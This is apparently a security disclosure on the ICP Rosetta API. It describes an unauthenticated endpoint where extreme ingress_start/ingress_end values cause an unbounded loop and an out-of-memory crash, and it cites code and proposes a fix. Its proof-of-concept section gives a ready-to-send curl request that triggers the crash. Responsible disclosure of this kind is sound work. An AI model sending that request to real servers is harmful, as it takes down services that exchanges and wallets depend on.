### Title
Unbounded `ingress_expiries` Loop via Attacker-Controlled `ingress_start`/`ingress_end` Causes OOM Crash — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The ICP Rosetta server's `POST /construction/payloads` endpoint accepts attacker-controlled `ingress_start` and `ingress_end` values with no authentication and no window-size guard. The loop that builds the `ingress_expiries` vector is unbounded, and the `Time::add_assign` implementation wraps on overflow, making the loop effectively infinite for extreme inputs. This causes OOM crash of the Rosetta server process.

---

### Finding Description

The loop at lines 99–107 of `construction_payloads.rs`:

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(...);
    now += interval;   // interval = 120 seconds in nanoseconds
}
``` [1](#0-0) 

`interval` is computed as `MAX_INGRESS_TTL - PERMITTED_DRIFT - 120s` = `300s - 60s - 120s` = **120 seconds** = `120_000_000_000` nanoseconds. [2](#0-1) 

`MAX_INGRESS_TTL = 300s`, `PERMITTED_DRIFT = 60s`: [3](#0-2) 

`ingress_start` and `ingress_end` are plain `Option<u64>` fields deserialized directly from the JSON request body with no validation: [4](#0-3) 

They are passed directly into `Time::from_nanos_since_unix_epoch` with no bounds check before the loop: [5](#0-4) 

**Overflow behavior makes the loop infinite.** `Time::AddAssign` is implemented as:

```rust
fn add_assign(&mut self, other: Duration) {
    *self = Time::from_duration(Duration::from_nanos(self.0) + other)
}
fn from_duration(t: Duration) -> Self {
    Time(t.as_nanos() as u64)  // truncating cast — wraps on overflow
}
``` [6](#0-5) [7](#0-6) 

When `now` approaches `u64::MAX`, adding `120_000_000_000` ns causes `as_nanos() as u64` to wrap to a small value still less than `ingress_end = u64::MAX`, so the loop never terminates.

**No authentication** is required. The endpoint is a plain unauthenticated POST: [8](#0-7) 

**Contrast with ICRC1 Rosetta**, which has explicit guards rejecting invalid windows before the loop: [9](#0-8) 

The ICP Rosetta implementation has no equivalent guard.

---

### Impact Explanation

With `ingress_start=0, ingress_end=u64::MAX`:
- Iterations before overflow wrap: `u64::MAX / 120_000_000_000 ≈ 153 billion`
- Memory per iteration: 8 bytes (one `u64` pushed to `ingress_expiries`)
- Memory before OOM: ~1.2 TB attempted allocation → process killed by OOM
- After wrap, the loop restarts from a small `now` value and continues indefinitely

The Rosetta server is a single process. Crashing it disrupts ICP Rosetta API service used by exchanges and wallets. Impact is scoped to the Rosetta replica process (medium).

---

### Likelihood Explanation

- No authentication required
- Single HTTP POST with two integer fields
- Reproducible locally with a trivial curl command
- No rate limiting visible in the server setup [10](#0-9) 

---

### Recommendation

Add a maximum ingress window size check before the loop, mirroring the ICRC1 Rosetta guard. For example:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 3600); // 24 hours
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request("ingress window too large"));
}
```

This caps the vector at `24h / 120s = 720` entries maximum.

---

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"..."},"amount":{"value":"-1","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"...","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

The server process will exhaust memory and crash (OOM) before returning a response.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/rosetta-api/icp/src/models.rs (L201-223)
```rust
pub struct ConstructionPayloadsRequestMetadata {
    /// The memo to use for a ledger transfer.
    /// A random number is used by default.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memo: Option<u64>,

    /// The earliest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_start: Option<u64>,

    /// The latest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_end: Option<u64>,

    /// If present, overrides ledger transaction creation time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created_at_time: Option<u64>,
}
```

**File:** rs/types/types/src/time.rs (L55-58)
```rust
impl std::ops::AddAssign<Duration> for Time {
    fn add_assign(&mut self, other: Duration) {
        *self = Time::from_duration(Duration::from_nanos(self.0) + other)
    }
```

**File:** rs/types/types/src/time.rs (L102-105)
```rust
    /// A private function to cast from [Duration] to [Time].
    fn from_duration(t: Duration) -> Self {
        Time(t.as_nanos() as u64)
    }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L124-131)
```rust
#[post("/construction/payloads")]
async fn construction_payloads(
    msg: web::Json<ConstructionPayloadsRequest>,
    req_handler: web::Data<RosettaRequestHandler>,
) -> HttpResponse {
    let res = req_handler.construction_payloads(msg.into_inner());
    to_rosetta_response(res, &req_handler.rosetta_metrics())
}
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L281-325)
```rust
impl RosettaApiServer {
    pub fn new<T: 'static + LedgerAccess + Send + Sync>(
        ledger: Arc<T>,
        req_handler: RosettaRequestHandler,
        addr: String,
        listen_port_file: Option<PathBuf>,
        expose_metrics: bool,
        watchdog_timeout_seconds: u64,
        initial_sync_complete: Arc<AtomicBool>,
    ) -> io::Result<Self> {
        let stopped = Arc::new(AtomicBool::new(false));
        let http_metrics_wrapper = RosettaMetrics::http_metrics_wrapper(expose_metrics);
        let server = HttpServer::new(move || {
            App::new()
                .wrap(http_metrics_wrapper.clone())
                .app_data(web::Data::new(
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
                        .error_handler(move |e, _| {
                            errors::convert_to_error(&ApiError::invalid_request(format!("{e:#?}")))
                                .into()
                        }),
                ))
                .app_data(web::Data::new(req_handler.clone()))
                .service(account_balance)
                .service(block)
                .service(call)
                .service(block_transaction)
                .service(construction_combine)
                .service(construction_derive)
                .service(construction_hash)
                .service(construction_metadata)
                .service(construction_parse)
                .service(construction_payloads)
                .service(construction_preprocess)
                .service(construction_submit)
                .service(mempool)
                .service(mempool_transaction)
                .service(network_list)
                .service(network_options)
                .service(network_status)
                .service(search_transactions)
                .service(status)
        })
        .bind(addr)?;
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```
